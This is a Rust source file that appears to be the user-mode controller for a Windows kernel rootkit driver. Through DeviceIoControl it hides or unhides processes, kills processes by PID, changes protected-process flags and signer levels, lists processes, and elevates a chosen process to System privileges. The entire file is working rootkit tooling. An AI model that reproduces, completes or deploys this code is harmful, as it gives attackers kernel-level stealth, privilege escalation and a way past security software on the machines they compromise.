use {
    log::*,
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    crate::{
        utils::{open_driver, Options}, 
        PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE,
    },
    shared::{
        vars::MAX_PID,
        structs::{
            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo,
            ProcessSignature, TargetProcess, ProcessProtection
        },
    },
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

pub struct Process {
    driver_handle: HANDLE,
}

impl Process {
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Failed to open driver");
        Process { driver_handle }
    }

    pub fn hide_unhide_process(&mut self, pid: Option<&u32>, ioctl_code: u32, enable: bool) {
        if let Some(pid_value) = pid {
            info!("Preparing to {} process: {}", if enable { "hide" } else { "unhide" }, pid_value);
            let pid = *pid_value as usize;
            let mut target_process = ProcessInfoHide { enable, pid };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<ProcessInfoHide>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} successfully {}hidden", pid, if enable { "" } else { "un" });
            }
        } else {
            error!("PID not supplied");
        }
    }

    pub fn terminate_process(&mut self, pid: Option<&u32>, ioctl_code: u32) {
        if let Some(pid_value) = pid {
            info!("Preparing to terminate process: {}", pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { pid };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} terminated successfully", pid);
            }
        } else {
            error!("PID not supplied");
        }
    }

    #[cfg(not(feature = "mapper"))]
    pub fn protection_process(&mut self, pid: Option<&u32>, ioctl_code: u32, enable: bool) {
        if let Some(pid_value) = pid {
            info!("Preparing to {} protection for process: {}", if enable { "enable" } else { "disable" }, pid_value);
            let pid = *pid_value as usize;
            let mut target_process = ProcessProtection { pid, enable };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<ProcessProtection>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} {} protection", pid, if enable { "enabled" } else { "disabled" });
            }
        } else {
            error!("PID not supplied");
        }
    }

    pub fn enumerate_process(&mut self, ioctl_code: u32, option: &Options) {
        let mut info_process: [ProcessListInfo; MAX_PID] = unsafe { std::mem::zeroed() };
        let mut enumeration_input = EnumerateInfoInput {
            options: option.to_shared(),
        };

        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut enumeration_input as *mut _ as *mut c_void,
                size_of::<EnumerateInfoInput>() as u32,
                info_process.as_mut_ptr() as *mut _,
                (info_process.len() * size_of::<ProcessListInfo>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            let total_process = return_buffer as usize / size_of::<ProcessListInfo>();
            info!("Total Processes: {}", total_process);
            println!("Listing Processes:");
            for (i, process) in info_process.iter().enumerate().take(total_process) {
                if process.pids > 0 {
                    println!("[{}] {}", i, process.pids);
                }
            }
        }
    }

    pub fn signature_process(&mut self, pid: Option<&u32>, ioctl_code: u32, sg: &PS_PROTECTED_SIGNER, tp: &PS_PROTECTED_TYPE) {
        if let Some(pid_value) = pid {
            info!("Preparing to apply signature protection for process: {}", pid_value);
            let pid = *pid_value as usize;
            let sg = *sg as usize;
            let tp = *tp as usize;
            let mut info_protection_process = ProcessSignature { pid, sg, tp };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut info_protection_process as *mut _ as *mut c_void,
                    size_of::<ProcessSignature>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} successfully protected", pid);
            }
        }
    }

    pub fn elevate_process(&mut self, pid: Option<&u32>, ioctl_code: u32) {
        if let Some(pid_value) = pid {
            info!("Preparing to elevate process: {}", pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { pid };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} elevated to System", pid);
            }
        } else {
            error!("PID not supplied");
        }
    }
}

impl Drop for Process {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
